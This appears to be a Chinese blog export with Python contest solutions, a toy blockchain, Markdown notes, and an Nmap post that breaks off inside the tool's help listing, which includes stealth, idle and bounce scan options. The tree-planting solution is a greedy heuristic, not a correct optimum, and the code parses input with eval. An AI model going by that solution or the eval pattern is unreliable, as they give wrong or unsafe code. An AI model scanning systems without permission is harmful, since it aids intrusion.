<p>这题也比较简单,动态规划.我的思路是根据奇偶的不同输出不同的.</p>
<ol start="8">
<li>问题描述<br>　　对于一个 n 行 m 列的表格，我们可以使用螺旋的方式给表格依次填上正整数，我们称填好的表格为一个螺旋矩阵。<br>　　例如，一个 4 行 5 列的螺旋矩阵如下：<br>　　1 2 3 4 5<br>　　14 15 16 17 6<br>　　13 20 19 18 7<br>　　12 11 10 9 8<br>输入格式<br>　　输入的第一行包含两个整数 n, m，分别表示螺旋矩阵的行数和列数。<br>　　第二行包含两个整数 r, c，表示要求的行号和列号。<br>输出格式<br>　　输出一个整数，表示螺旋矩阵中第 r 行第 c 列的元素的值。<br>样例输入<br>4 5<br>2 2<br>样例输出<br>15<br>评测用例规模与约定<br>　　对于 30% 的评测用例，2 &lt;= n, m &lt;= 20。<br>　　对于 70% 的评测用例，2 &lt;= n, m &lt;= 100。<br>　　对于所有评测用例，2 &lt;= n, m &lt;= 1000，1 &lt;= r &lt;= n，1 &lt;= c &lt;= m。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n, m &#x3D; input().split(&quot; &quot;)</span><br><span class="line">r, c &#x3D; input().split()</span><br><span class="line">n &#x3D; eval(n)</span><br><span class="line">m &#x3D; eval(m)</span><br><span class="line">r &#x3D; eval(r)</span><br><span class="line">c &#x3D; eval(c)</span><br><span class="line"></span><br><span class="line">array &#x3D; [0 for i in range(m * n)]</span><br><span class="line">statue &#x3D; [0 for i in range(m * n)]</span><br><span class="line">toward &#x3D; &quot;right&quot;</span><br><span class="line">num &#x3D; 1</span><br><span class="line">i &#x3D; 0</span><br><span class="line">j &#x3D; 0</span><br><span class="line"># i*m+j</span><br><span class="line">while True:</span><br><span class="line">    if toward &#x3D;&#x3D; &quot;up&quot;:</span><br><span class="line">        array[i * m + j] &#x3D; num</span><br><span class="line">        statue[i * m + j] &#x3D; -999</span><br><span class="line">        num +&#x3D; 1</span><br><span class="line">        if i - 1 &lt; 0 or statue[(i - 1) * m + j] &#x3D;&#x3D; -999:</span><br><span class="line">            toward &#x3D; &quot;right&quot;</span><br><span class="line">            j +&#x3D; 1</span><br><span class="line">        else:</span><br><span class="line">            i -&#x3D; 1</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">    elif toward &#x3D;&#x3D; &quot;down&quot;:</span><br><span class="line">        array[i * m + j] &#x3D; num</span><br><span class="line">        statue[i * m + j] &#x3D; -999</span><br><span class="line">        num +&#x3D; 1</span><br><span class="line">        if i + 1 &gt; n - 1 or statue[(i + 1) * m + j] &#x3D;&#x3D; -999:</span><br><span class="line">            toward &#x3D; &quot;left&quot;</span><br><span class="line">            j -&#x3D; 1</span><br><span class="line">        else:</span><br><span class="line">            i +&#x3D; 1</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">    elif toward &#x3D;&#x3D; &quot;left&quot;:</span><br><span class="line">        array[i * m + j] &#x3D; num</span><br><span class="line">        statue[i * m + j] &#x3D; -999</span><br><span class="line">        num +&#x3D; 1</span><br><span class="line">        if j - 1 &lt; 0 or statue[i * m + j - 1] &#x3D;&#x3D; -999:</span><br><span class="line">            toward &#x3D; &quot;up&quot;</span><br><span class="line">            i -&#x3D; 1</span><br><span class="line">        else:</span><br><span class="line">            j -&#x3D; 1</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">    elif toward &#x3D;&#x3D; &quot;right&quot;:</span><br><span class="line">        array[i * m + j] &#x3D; num</span><br><span class="line">        statue[i * m + j] &#x3D; -999</span><br><span class="line">        num +&#x3D; 1</span><br><span class="line">        if j + 1 &gt; m - 1 or statue[i * m + j + 1] &#x3D;&#x3D; -999:</span><br><span class="line">            toward &#x3D; &quot;down&quot;</span><br><span class="line">            i +&#x3D; 1</span><br><span class="line">        else:</span><br><span class="line">            j +&#x3D; 1</span><br><span class="line">            continue</span><br><span class="line"></span><br><span class="line">    if num &#x3D;&#x3D; m * n + 1:</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">print(array[(r - 1) * m + (c - 1)])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这就是最基础的python写螺旋数组…<br>由于我懒得用二维数组这么复杂的东西,直接一维的列表,根据行列关系换算成一维的位置,然后根据状态填写数字.填写过的是-999.主要需要注意的是越界问题.</p>
<ol start="9">
<li>问题描述<br>　　2015年，全中国实现了户户通电。作为一名电力建设者，小明正在帮助一带一路上的国家通电。<br>　　这一次，小明要帮助 n 个村庄通电，其中 1 号村庄正好可以建立一个发电站，所发的电足够所有村庄使用。<br>　　现在，这 n 个村庄之间都没有电线相连，小明主要要做的是架设电线连接这些村庄，使得所有村庄都直接或间接的与发电站相通。<br>　　小明测量了所有村庄的位置（坐标）和高度，如果要连接两个村庄，小明需要花费两个村庄之间的坐标距离加上高度差的平方，形式化描述为坐标为 (x_1, y_1) 高度为 h_1 的村庄与坐标为 (x_2, y_2) 高度为 h_2 的村庄之间连接的费用为<br>　　sqrt((x_1-x_2)<em>(x_1-x_2)+(y_1-y_2)</em>(y_1-y_2))+(h_1-h_2)*(h_1-h_2)。<br>　　在上式中 sqrt 表示取括号内的平方根。请注意括号的位置，高度的计算方式与横纵坐标的计算方式不同。<br>　　由于经费有限，请帮助小明计算他至少要花费多少费用才能使这 n 个村庄都通电。<br>输入格式<br>　　输入的第一行包含一个整数 n ，表示村庄的数量。<br>　　接下来 n 行，每个三个整数 x, y, h，分别表示一个村庄的横、纵坐标和高度，其中第一个村庄可以建立发电站。<br>输出格式<br>　　输出一行，包含一个实数，四舍五入保留 2 位小数，表示答案。<br>样例输入<br>4<br>1 1 3<br>9 9 7<br>8 8 6<br>4 5 4<br>样例输出</li>
<li>41<br>评测用例规模与约定<br>　　对于 30% 的评测用例，1 &lt;= n &lt;= 10；<br>　　对于 60% 的评测用例，1 &lt;= n &lt;= 100；<br>　　对于所有评测用例，1 &lt;= n &lt;= 1000，0 &lt;= x, y, h &lt;= 10000。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from math import sqrt</span><br><span class="line">from decimal import Decimal</span><br><span class="line"></span><br><span class="line">def cash(l1, l2):</span><br><span class="line">    return sqrt((l1[0] - l2[0])**2 + (l1[1] - l2[1])**2) + (l1[2] - l2[2])**2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n &#x3D; eval(input())</span><br><span class="line">countryside &#x3D; []</span><br><span class="line">for i in range(n):</span><br><span class="line">    a, b, c &#x3D; input().split(&quot; &quot;)</span><br><span class="line">    countryside.append([eval(a), eval(b), eval(c)])</span><br><span class="line"></span><br><span class="line">candidate_node &#x3D; [i for i in range(n)]</span><br><span class="line">selected_node &#x3D; []</span><br><span class="line">money &#x3D; 0</span><br><span class="line"></span><br><span class="line">temp &#x3D; candidate_node.pop()</span><br><span class="line">selected_node.append(temp)</span><br><span class="line">while True:</span><br><span class="line">    if candidate_node &#x3D;&#x3D; []:</span><br><span class="line">        break</span><br><span class="line">    # prim</span><br><span class="line">    min_index &#x3D; 100000</span><br><span class="line">    min_cash &#x3D; 100000</span><br><span class="line">    for i in selected_node:</span><br><span class="line">        for j in candidate_node:</span><br><span class="line">            temp_cash &#x3D; cash(countryside[i], countryside[j])</span><br><span class="line">            if temp_cash &lt; min_cash:</span><br><span class="line">                min_cash &#x3D; temp_cash</span><br><span class="line">                min_index &#x3D; j</span><br><span class="line">    selected_node.append(min_index)</span><br><span class="line">    candidate_node.remove(min_index)</span><br><span class="line">    money +&#x3D; min_cash</span><br><span class="line"></span><br><span class="line">money &#x3D; Decimal(str(money)).quantize(Decimal(&#39;0.00&#39;))</span><br><span class="line">print(money)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>老生常谈的一个问题了.肉眼一看就知道的最小生成树的题目.这次使用的是prim算法.<br>在写这个题目的时候看错了钱的计算公式导致浪费了不少时间,这是不应该的.<br>而且对于Python而言,四舍五入最好别用round()函数,因为它拥有不确定性,而应该采用科学的Decimal库.这个是自带的库.</p>
<ol start="10">
<li>问题描述<br>　　小明和朋友们一起去郊外植树，他们带了一些在自己实验室精心研究出的小树苗。<br>　　小明和朋友们一共有 n 个人，他们经过精心挑选，在一块空地上每个人挑选了一个适合植树的位置，总共 n 个。他们准备把自己带的树苗都植下去。<br>　　然而，他们遇到了一个困难：有的树苗比较大，而有的位置挨太近，导致两棵树植下去后会撞在一起。<br>　　他们将树看成一个圆，圆心在他们找的位置上。如果两棵树对应的圆相交，这两棵树就不适合同时植下（相切不受影响），称为两棵树冲突。<br>　　小明和朋友们决定先合计合计，只将其中的一部分树植下去，保证没有互相冲突的树。他们同时希望这些树所能覆盖的面积和（圆面积和）最大。<br>输入格式<br>　　输入的第一行包含一个整数 n ，表示人数，即准备植树的位置数。<br>　　接下来 n 行，每行三个整数 x, y, r，表示一棵树在空地上的横、纵坐标和半径。<br>输出格式<br>　　输出一行包含一个整数，表示在不冲突下可以植树的面积和。由于每棵树的面积都是圆周率的整数倍，请输出答案除以圆周率后的值（应当是一个整数）。<br>样例输入<br>6<br>1 1 2<br>1 4 2<br>1 7 2<br>4 1 2<br>4 4 2<br>4 7 2<br>样例输出<br>12<br>评测用例规模与约定<br>　　对于 30% 的评测用例，1 &lt;= n &lt;= 10；<br>　　对于 60% 的评测用例，1 &lt;= n &lt;= 20；<br>　　对于所有评测用例，1 &lt;= n &lt;= 30，0 &lt;= x, y &lt;= 1000，1 &lt;= r &lt;= 1000。</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">n &#x3D; eval(input())</span><br><span class="line">tree &#x3D; []</span><br><span class="line">for i in range(n):</span><br><span class="line">    x, y, r &#x3D; input().split(&quot; &quot;)</span><br><span class="line">    tree.append([eval(x), eval(y), eval(r)])</span><br><span class="line"></span><br><span class="line">def cal(l1, l2):</span><br><span class="line">    dis &#x3D; (l1[0]-l2[0])**2 + (l1[1]-l2[1])**2</span><br><span class="line">    if dis &lt; (l1[2] + l2[2])**2:</span><br><span class="line">        return False</span><br><span class="line">    else:</span><br><span class="line">        return True</span><br><span class="line"></span><br><span class="line">def judge(l1, l2):</span><br><span class="line">    for i in l1:</span><br><span class="line">        temp &#x3D; cal(tree[i], l2)</span><br><span class="line">        if temp:</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">            return False</span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">def cal_area(l1, l2):</span><br><span class="line">    ret &#x3D; 0</span><br><span class="line">    for i in l1:</span><br><span class="line">        ret +&#x3D; l2[i][2]**2</span><br><span class="line">    return ret</span><br><span class="line"></span><br><span class="line">selected_node &#x3D; []</span><br><span class="line">candidate_node &#x3D; [i for i in range(n)]</span><br><span class="line">max_area &#x3D; 0</span><br><span class="line">for i in range(n):</span><br><span class="line">    selected_node.append(i)</span><br><span class="line">    candidate_node.remove(i)</span><br><span class="line">    for j in candidate_node:</span><br><span class="line">        if judge(selected_node, tree[j]):</span><br><span class="line">            selected_node.append(j)</span><br><span class="line">            candidate_node.remove(j)</span><br><span class="line">    temp &#x3D; cal_area(selected_node, tree)</span><br><span class="line">    if temp &gt; max_area:</span><br><span class="line">        max_area &#x3D; temp</span><br><span class="line">    selected_node &#x3D; []</span><br><span class="line">    candidate_node &#x3D; [i for i in range(n)]</span><br><span class="line"></span><br><span class="line">print(max_area)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这是我的解题思路,我自己感觉比较的笨,时间复杂度也就比较高.本来的思路是dfs.后来阴差阳错的写成了这样的…..写都写了就这么写吧…<br>如果这一题有什么更好的思路也欢迎来交流交流哇!</p>
<hr>
<p>By. AbeanCC<br>QQ. 527430509<br>Thanks</p>
]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>BlcokChain[1]--SimpleBlockChian</title>
    <url>/2020/01/16/BlcokChain-1-SimpleBlockChian/</url>
    <content><![CDATA[<h2 id="记录一下简单的BlockChain的实现"><a href="#记录一下简单的BlockChain的实现" class="headerlink" title="记录一下简单的BlockChain的实现"></a>记录一下简单的BlockChain的实现</h2><p>Language: python</p>
<hr>
<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>BlockChain,说这个东西大家都会说,但是其中大有讲究.<br>今天我们就稍微的实现一下基本的框架,包括Block的基本结构,Chain的基本结构,以及一些基本的方法.</p>
<hr>
<h3 id="Block"><a href="#Block" class="headerlink" title="Block"></a>Block</h3><p>block,一个块,这个快能存什么呢?</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Block&#123;</span><br><span class="line">    data;</span><br><span class="line">    Hash;</span><br><span class="line">    PreviousHash;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中,data表示的就是这个块里存储的数据<br>PreviousHash存储的是前一个块的Hash<br>而这个Hash呢,是计算得到的.<br>今天的简易版区块链,不包含pow机制,不包含动态难度,就只是简单的实现,于是我使用的是PreviousHash和data的拼接的Hash来表示</p>
<p>(实际中需要加上难度指数,这样再加上刷新时间,就可以有效的防范攻击.其实本质上来说,是让对手没有那么足够的算力,来支持自己修改区块)</p>
<p>实现起来也很容易:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Block:</span><br><span class="line">    def __init__(self, data, previousHash):</span><br><span class="line">        self.data &#x3D; data</span><br><span class="line">        self.previousHash &#x3D; previousHash</span><br><span class="line">        self.ownhash &#x3D; self.ComputeHash()</span><br><span class="line"></span><br><span class="line">    def ComputeHash(self):</span><br><span class="line">        &#39;&#39;&#39;计算Hash值&#39;&#39;&#39;</span><br><span class="line">        sha256 &#x3D; hashlib.sha256()</span><br><span class="line">        sha256.update((str(self.data) + self.previousHash).encode(&quot;utf-8&quot;))</span><br><span class="line">        return sha256.hexdigest()</span><br><span class="line"></span><br><span class="line">    def StandardOutput(self):</span><br><span class="line">        &#39;&#39;&#39;标准化输出&#39;&#39;&#39;</span><br><span class="line">        print(&quot;Block:\n\t\tData: &#123;&#125;\n\t\tOwnHash: &#123;&#125;\n\t\tPreviousHash: &#123;&#125;&quot;.format(self.data, self.ownhash, self.previousHash), end&#x3D;&quot;\n&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这就是一个简单的Block类</p>
<hr>
<h3 id="Chain"><a href="#Chain" class="headerlink" title="Chain"></a>Chain</h3><p>这个链也很简单,就是把所有的Block串起来,利用Hash进行索引的一个特殊的链表<br>当然要实现它的纠错能力.</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Chain:</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.chainlist &#x3D; [self.GenesisBlock()]</span><br><span class="line"></span><br><span class="line">    def GenesisBlock(self):</span><br><span class="line">        &#39;&#39;&#39;创建祖先区块&#39;&#39;&#39;</span><br><span class="line">        return Block(&quot;Genesis&quot;, &quot;&quot;)</span><br><span class="line"></span><br><span class="line">    def InsertNewBlock(self, data):</span><br><span class="line">        &#39;&#39;&#39;插入新的区块&#39;&#39;&#39;</span><br><span class="line">        newblock &#x3D; Block(data, self.chainlist[-1].ownhash)</span><br><span class="line">        self.chainlist.append(newblock)</span><br><span class="line"></span><br><span class="line">    def StandardOutput(self):</span><br><span class="line">        &#39;&#39;&#39;标准化输出&#39;&#39;&#39;</span><br><span class="line">        print(&quot;Chain:\n&quot;, end&#x3D;&quot;&quot;)</span><br><span class="line">        for i in range(0, len(self.chainlist)):</span><br><span class="line">            print(&quot;&quot;,end&#x3D;&quot;\t&quot;)</span><br><span class="line">            self.chainlist[i].StandardOutput()</span><br><span class="line"></span><br><span class="line">    def ValidateChain(self):</span><br><span class="line">        &#39;&#39;&#39;验证区块链是否合法&#39;&#39;&#39;</span><br><span class="line">        for i in range(1, len(self.chainlist)):</span><br><span class="line">            if self.chainlist[i].ownhash &#x3D;&#x3D; self.chainlist[i].ComputeHash():</span><br><span class="line">                if self.chainlist[i].previousHash !&#x3D; self.chainlist[i-1].ownhash:</span><br><span class="line">                    print(&quot;前后区块链断裂&quot;)</span><br><span class="line">                    return False</span><br><span class="line">                else:</span><br><span class="line">                    continue</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;数据被篡改&quot;)</span><br><span class="line">                return False</span><br><span class="line">        return True</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="主函数部分"><a href="#主函数部分" class="headerlink" title="主函数部分"></a>主函数部分</h3><p>就可以发挥自己的想象力啦,想加什么就加什么,非常的方便.</p>
<p>比如:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    chain &#x3D; Chain()</span><br><span class="line">    chain.InsertNewBlock(&quot;我有十块钱&quot;)</span><br><span class="line">    chain.InsertNewBlock(&quot;我有二十块钱&quot;)</span><br><span class="line">    chain.InsertNewBlock(&quot;我有三十块钱&quot;)</span><br><span class="line">    chain.InsertNewBlock(&quot;我有四十块钱&quot;)</span><br><span class="line">    chain.InsertNewBlock(&quot;我有五十块钱&quot;)</span><br><span class="line">    chain.StandardOutput()</span><br><span class="line">    print(chain.ValidateChain())</span><br></pre></td></tr></table></figure>

<p>然后输出结果就是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Chain:</span><br><span class="line">        Block:</span><br><span class="line">                Data: Genesis</span><br><span class="line">                OwnHash: 81ddc8d248b2dccdd3fdd5e84f0cad62b08f2d10b57f9a831c13451e5c5c80a5</span><br><span class="line">                PreviousHash: </span><br><span class="line">        Block:</span><br><span class="line">                Data: 我有十块钱</span><br><span class="line">                OwnHash: e955d6b2656633c5855cfd08c9f96f4d6cf1233115c6b28ef2e8acb0ea0be9e0</span><br><span class="line">                PreviousHash: 81ddc8d248b2dccdd3fdd5e84f0cad62b08f2d10b57f9a831c13451e5c5c80a5</span><br><span class="line">        Block:</span><br><span class="line">                Data: 我有二十块钱</span><br><span class="line">                OwnHash: 444d95fe961da65f4ab2990380c390c1558b7d0d516848dd332e9b7d62c632d0</span><br><span class="line">                PreviousHash: e955d6b2656633c5855cfd08c9f96f4d6cf1233115c6b28ef2e8acb0ea0be9e0</span><br><span class="line">        Block:</span><br><span class="line">                OwnHash: c616e399a667b3a3f7c110b48e433846b6fd7f3fe703820b2a59ed61d2cc99ed</span><br><span class="line">                PreviousHash: 444d95fe961da65f4ab2990380c390c1558b7d0d516848dd332e9b7d62c632d0</span><br><span class="line">        Block:</span><br><span class="line">                Data: 我有四十块钱</span><br><span class="line">                OwnHash: 2619942d5689a95bfc899d503d702db784b14834d34ea5000c3c1625a89558e7</span><br><span class="line">                PreviousHash: c616e399a667b3a3f7c110b48e433846b6fd7f3fe703820b2a59ed61d2cc99ed</span><br><span class="line">        Block:</span><br><span class="line">                Data: 我有五十块钱</span><br><span class="line">                OwnHash: 5b931c9e6e7da60d5a74203264ed49fd5111e064df80acf642fb6220ebf9d642</span><br><span class="line">                PreviousHash: 2619942d5689a95bfc899d503d702db784b14834d34ea5000c3c1625a89558e7</span><br><span class="line">True</span><br></pre></td></tr></table></figure>
<p>这也就预示着,这个简单的区块链就完成啦.</p>
]]></content>
      <categories>
        <category>代码</category>
      </categories>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>MarkDown的使用记录</title>
    <url>/2019/12/01/MarkDown%E7%9A%84%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="记录一些关于MarkDown的语法"><a href="#记录一些关于MarkDown的语法" class="headerlink" title="记录一些关于MarkDown的语法"></a>记录一些关于MarkDown的语法</h2><hr>
<h3 id="MarkDown的介绍"><a href="#MarkDown的介绍" class="headerlink" title="MarkDown的介绍"></a>MarkDown的介绍</h3><p>Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。</p>
<p><em><strong>相信我，一旦你熟悉了md的使用，你便会对其爱不释手</strong></em></p>
<hr>
<h3 id="MarkDown标题"><a href="#MarkDown标题" class="headerlink" title="MarkDown标题"></a>MarkDown标题</h3><p>每一级标题对应一个<code>#</code>,最多到6级</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 一级标题</span><br><span class="line">## 二级标题</span><br><span class="line">### 三级标题</span><br><span class="line">#### 四级标题</span><br><span class="line">##### 五级标题</span><br><span class="line">###### 六级标题</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="MarkDown段落格式"><a href="#MarkDown段落格式" class="headerlink" title="MarkDown段落格式"></a>MarkDown段落格式</h3><ul>
<li><p>字体<br><code>*斜体*</code><br><code>**粗体**</code><br><code>***粗斜体***</code><br>exp:</p>
</li>
<li><p>我是斜体*</p>
</li>
<li><p><em>我是粗体</em>*</p>
</li>
<li><p><strong>我是粗斜体</strong>*</p>
</li>
<li><p>分隔线<br><code>---</code><br>就可以分隔了</p>
</li>
<li><p>删除线<br><code>~~删除内容~~</code><br>exp:<br><del>我被删除了！</del></p>
</li>
<li><p>下划线<br><code>&lt;u&gt;下划内容&lt;/u&gt;</code><br>exp:<br><u>我有鞋子</u></p>
</li>
<li><p>脚注<br><code>[^要注明的内容]</code><br><code>[^要注明的内容]: abcd</code><br>exp<br>我有帽子啦[^哇]<br>[^哇]: I’m hat</p>
</li>
</ul>
<hr>
<h3 id="MarkDown列表"><a href="#MarkDown列表" class="headerlink" title="MarkDown列表"></a>MarkDown列表</h3><h4 id="无序列表"><a href="#无序列表" class="headerlink" title="无序列表"></a>无序列表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">* 第一项</span><br><span class="line">* 第二项</span><br><span class="line">* 第三项</span><br></pre></td></tr></table></figure>
<p>exp</p>
<ul>
<li>I’m First</li>
<li>I’m Second</li>
<li>I’m Third</li>
</ul>
<h4 id="有序列表"><a href="#有序列表" class="headerlink" title="有序列表"></a>有序列表</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1. 第一</span><br><span class="line">2. 第二</span><br><span class="line">3. 第三</span><br></pre></td></tr></table></figure>
<p>exp</p>
<ol>
<li>第一</li>
<li>第二</li>
<li>第三</li>
</ol>
<hr>
<h3 id="MarkDown代码区块"><a href="#MarkDown代码区块" class="headerlink" title="MarkDown代码区块"></a>MarkDown代码区块</h3><ul>
<li>用``就可以表示<br>exp<br><code>You can really dance!</code></li>
<li>用```来表示代码块<br>exp<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Cause I knew you were trouble when I walked in,</span><br><span class="line">Shame on me now.</span><br><span class="line">Flew me to place I had never been,</span><br><span class="line">Till you put me down.</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="MarkDown链接"><a href="#MarkDown链接" class="headerlink" title="MarkDown链接"></a>MarkDown链接</h3><ul>
<li><code>[名字](地址)</code><br>exp<br><a href="AbeanCC.github.io">AbeanCC’s blog</a></li>
</ul>
<hr>
<h3 id="MarkDown图片"><a href="#MarkDown图片" class="headerlink" title="MarkDown图片"></a>MarkDown图片</h3><ul>
<li><code>![alt 属性文本](图片地址)</code><br>exp<br><img src="http://img.52z.com/upload/news/image/20180509/20180509085549_56494.jpg" alt="alt jpg"></li>
</ul>
<hr>
<h3 id="MarkDown表格"><a href="#MarkDown表格" class="headerlink" title="MarkDown表格"></a>MarkDown表格</h3><ul>
<li><table>
<thead>
<tr>
<th>表头</th>
<th>表头</th>
</tr>
</thead>
<tbody><tr>
<td>单元格</td>
<td>单元格</td>
</tr>
<tr>
<td>单元格</td>
<td>单元格</td>
</tr>
</tbody></table>
</li>
</ul>
<p>exp<br>|  表头   | 表头  |<br>|  —-  | —-  |<br>| 单元格  | 单元格 |<br>| 单元格  | 单元格 |</p>
<p><strong>值得一提的是，有左对齐，居中和右对齐三种方式</strong></p>
<ul>
<li>=- 左对齐</li>
<li>=-= 居中</li>
<li>-= 右对齐</li>
</ul>
<h2 id="当然还有-amp-nbsp-它表示一个空格。"><a href="#当然还有-amp-nbsp-它表示一个空格。" class="headerlink" title="当然还有&amp;nbsp;它表示一个空格。"></a>当然还有<code>&amp;nbsp;</code>它表示一个空格。</h2><p><strong>以上就是我对MarkDown的基础用法的总结啦，至于更高级的用法，还需要靠日后的多家摸索才行呀！</strong></p>
]]></content>
      <categories>
        <category>markdown</category>
      </categories>
      <tags>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmap使用记录</title>
    <url>/2019/12/08/Nmap%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h2 id="Nmap使用记录"><a href="#Nmap使用记录" class="headerlink" title="Nmap使用记录"></a>Nmap使用记录</h2><hr>
<p><strong>前言: Nmap是真的真的好用,我的天呐真的是神器.我曾经自己写过端口扫描器,但是功能远远不如Nmap,于是我开始反思为什么不偷懒而要自己写呢?人类真是奇怪的生物~</strong></p>
<hr>
<p>进入正题.</p>
<p>输入<code>Nmap --help</code>即可获得帮助</p>
<p><del>好了,我说完了.</del></p>
<p>怎么可能嘛!</p>
<p>你会得到这么多</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TARGET SPECIFICATION:</span><br><span class="line">  Can pass hostnames, IP addresses, networks, etc.</span><br><span class="line">  Ex: scanme.nmap.org, microsoft.com&#x2F;24, 192.168.0.1; 10.0.0-255.1-254</span><br><span class="line">  -iL &lt;inputfilename&gt;: Input from list of hosts&#x2F;networks</span><br><span class="line">  -iR &lt;num hosts&gt;: Choose random targets</span><br><span class="line">  --exclude &lt;host1[,host2][,host3],...&gt;: Exclude hosts&#x2F;networks</span><br><span class="line">  --excludefile &lt;exclude_file&gt;: Exclude list from file</span><br><span class="line">HOST DISCOVERY:</span><br><span class="line">  -sL: List Scan - simply list targets to scan</span><br><span class="line">  -sn: Ping Scan - disable port scan</span><br><span class="line">  -Pn: Treat all hosts as online -- skip host discovery</span><br><span class="line">  -PS&#x2F;PA&#x2F;PU&#x2F;PY[portlist]: TCP SYN&#x2F;ACK, UDP or SCTP discovery to given ports</span><br><span class="line">  -PE&#x2F;PP&#x2F;PM: ICMP echo, timestamp, and netmask request discovery probes</span><br><span class="line">  -PO[protocol list]: IP Protocol Ping</span><br><span class="line">  -n&#x2F;-R: Never do DNS resolution&#x2F;Always resolve [default: sometimes]</span><br><span class="line">  --dns-servers &lt;serv1[,serv2],...&gt;: Specify custom DNS servers</span><br><span class="line">  --system-dns: Use OS&#39;s DNS resolver</span><br><span class="line">  --traceroute: Trace hop path to each host</span><br><span class="line">SCAN TECHNIQUES:</span><br><span class="line">  -sS&#x2F;sT&#x2F;sA&#x2F;sW&#x2F;sM: TCP SYN&#x2F;Connect()&#x2F;ACK&#x2F;Window&#x2F;Maimon scans</span><br><span class="line">  -sU: UDP Scan</span><br><span class="line">  -sN&#x2F;sF&#x2F;sX: TCP Null, FIN, and Xmas scans</span><br><span class="line">  --scanflags &lt;flags&gt;: Customize TCP scan flags</span><br><span class="line">  -sI &lt;zombie host[:probeport]&gt;: Idle scan</span><br><span class="line">  -sY&#x2F;sZ: SCTP INIT&#x2F;COOKIE-ECHO scans</span><br><span class="line">  -sO: IP protocol scan</span><br><span class="line">  -b &lt;FTP relay host&gt;: FTP bounce scan</span><br><span class="line">PORT SPECIFICATION AND SCAN ORDER:</span><br><span class="line">  -p &lt;port ranges&gt;: Only scan specified ports</span><br><span class="line">    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</span><br><span class="line">  --exclude-ports &lt;port ranges&gt;: Exclude the specified ports from scanning</span><br><span class="line">  -F: Fast mode - Scan fewer ports than the default scan</span><br><span class="line">  -r: Scan ports consecutively - don&#39;t randomize</span><br><span class="line">  --top-ports &lt;number&gt;: Scan &lt;number&gt; most common ports</span><br><span class="line">  --port-ratio &lt;ratio&gt;: Scan ports more common than &lt;ratio&gt;</span><br><span class="line">SERVICE&#x2F;VERSION DETECTION:</span><br><span class="line">  -sV: Probe open ports to determine service&#x2F;version info</span><br><span class="line">  --version-intensity &lt;level&gt;: Set from 0 (light) to 9 (try all probes)</span><br><span class="line">  --version-light: Limit to most likely probes (intensity 2)</span><br><span class="line">  --version-all: Try every single probe (intensity 9)</span><br><span class="line">  --version-trace: Show detailed version scan activity (for debugging)</span><br><span class="line">SCRIPT SCAN:</span><br><span class="line">  -sC: equivalent to --script&#x3D;default</span><br><span class="line">  --script&#x3D;&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of</span><br><span class="line">           directories, script-files or script-categories</span><br><span class="line">  --script-args&#x3D;&lt;n1&#x3D;v1,[n2&#x3D;v2,...]&gt;: provide arguments to scripts</span><br><span class="line">  --script-args-file&#x3D;filename: provide NSE script args in a file</span><br><span class="line">  --script-trace: Show all data sent and received</span><br><span class="line">  --script-updatedb: Update the script database.</span><br><span class="line">  --script-help&#x3D;&lt;Lua scripts&gt;: Show help about scripts.</span><br><span class="line">           &lt;Lua scripts&gt; is a comma-separated list of script-files or</span><br><span class="line">           script-categories.</span><br><span class="line">OS DETECTION:</span><br><span class="line">  -O: Enable OS detection</span><br><span class="line">  --osscan-limit: Limit OS detection to promising targets</span><br><span class="line">  --osscan-guess: Guess OS more aggressively</span><br><span class="line">TIMING AND PERFORMANCE:</span><br><span class="line">  Options which take &lt;time&gt; are in seconds, or append &#39;ms&#39; (milliseconds),</span><br><span class="line">  &#39;s&#39; (seconds), &#39;m&#39; (minutes), or &#39;h&#39; (hours) to the value (e.g. 30m).</span><br><span class="line">  -T&lt;0-5&gt;: Set timing template (higher is faster)</span><br><span class="line">  --min-hostgroup&#x2F;max-hostgroup &lt;size&gt;: Parallel host scan group sizes</span><br><span class="line">  --min-parallelism&#x2F;max-parallelism &lt;numprobes&gt;: Probe parallelization</span><br><span class="line">  